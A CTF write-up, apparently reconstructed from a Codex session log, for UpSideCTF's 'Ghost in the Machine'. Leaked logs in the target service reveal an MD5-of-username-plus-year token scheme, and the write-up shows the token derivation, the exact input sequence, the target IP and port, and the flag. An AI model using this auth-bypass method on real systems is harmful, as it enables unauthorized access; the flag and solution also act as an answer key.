---
title: "UpSideCTF: Ghost In The Machine"
description: "Reconstructed Codex writeup for Ghost in the Machine from UpSideCTF. Original prompt weight: 40 points."
slug: upsidectf-ghost-in-the-machine
date: 2026-03-25 08:21:54.645+0000
categories:
    - Misc
tags:
    - codex-archive
    - upsidectf
    - ghost-in-the-machine
---

## Challenge

- Competition: [UpSideCTF](https://upsidectf.online/challenges)
- Challenge: `Ghost in the Machine`
- Category: `Misc`
- Points: `40`

## Reconstruction Note

This post is reconstructed from the local Codex session log and the challenge artifacts stored in this workspace.

Prompt snapshot: Challenge RECOVERED LOGS - HAWKINS NATIONAL LABORATORY We've breached the perimeter, but the real secrets are buried deep within the mainframe. Dr. Brenner has sealed the primary subject database behind an internal-only portal that doesn't recognize outside voices. However, a...


## Solve Path

FLAG:
CTF{Dr_n0_br3nn3R}

WRITEUP:
1) Target Overview
- URL / endpoint: `140.245.25.63:8005`
- Tech stack (if known): Raw TCP terminal exposed on a web-looking port; `curl` only worked with `--http0.9` because the service returns a body without normal HTTP headers.
- Observed behavior: The service prompts for a username, issues an access token, then exposes a menu with logs and an admin validation path.

2) Recon
- Directory discovery: N/A. This is not a normal HTTP site.
- Parameters found: `username`, menu option (`1`-`4`), admin access token.
- Cookies / sessions: None observed.
- Headers: None observed; nonstandard `HTTP/0.9`-style response body.
- JS analysis: N/A.
- Hidden endpoints: N/A.
- Source review: N/A.
- Key leaked evidence from option `1`:
  - Token scheme is `MD5(username + "1983")`.
  - Brenner’s exact operator ID is `DrBrenner`.

3) Vulnerability
- Type: Predictable token / auth bypass via information disclosure.
- Root cause: The terminal logs disclose both the token-generation algorithm and the admin username, letting an attacker derive the admin token offline.
- Proof of vulnerability:
```text
[Nov 05] Owens: ... take our username, stick the year the lab was founded ('1983') at the end, and run it through a basic MD5 hash?
[Nov 05] Brenner: ... my Operator ID is exactly 'DrBrenner'
```
- Admin token derivation:
```bash
python -c "import hashlib; print(hashlib.md5(b'DrBrenner1983').hexdigest())"
```
- Result:
```text
43095647eb9196088480eab17e08605a
```

4) Exploitation
- Step-by-step terminal inputs:
```text
1. Connect to 140.245.25.63:8005
2. Enter any username, for example: testuser
3. Choose: 1
4. Read the recovered logs to learn:
   - username = DrBrenner
   - token = MD5("DrBrenner1983")
5. Choose: 3
6. Submit token: 43095647eb9196088480eab17e08605a
7. Choose: 1
```
- Raw interaction sequence:
```text
testuser
1
3
43095647eb9196088480eab17e08605a
1
```
- Why it works: Admin validation accepts the correctly derived Brenner token, regardless of the initial low-privilege username, and unlocks the classified logs.

5) Flag Extraction
- Exact request that returns the flag:
```text
Connect to 140.245.25.63:8005
Username: testuser
Menu: 1
Menu: 3
Token: 43095647eb9196088480eab17e08605a
Menu: 1
```
- Response proof:
```text
--- CLASSIFIED NINA LOGS ---
Brenner: The tear in spacetime is expanding.
Owens: We need more power to the containment grid.
System: WARNING - Subject 011 has escaped. Protocol override. CTF{Dr_n0_br3nn3R}
```
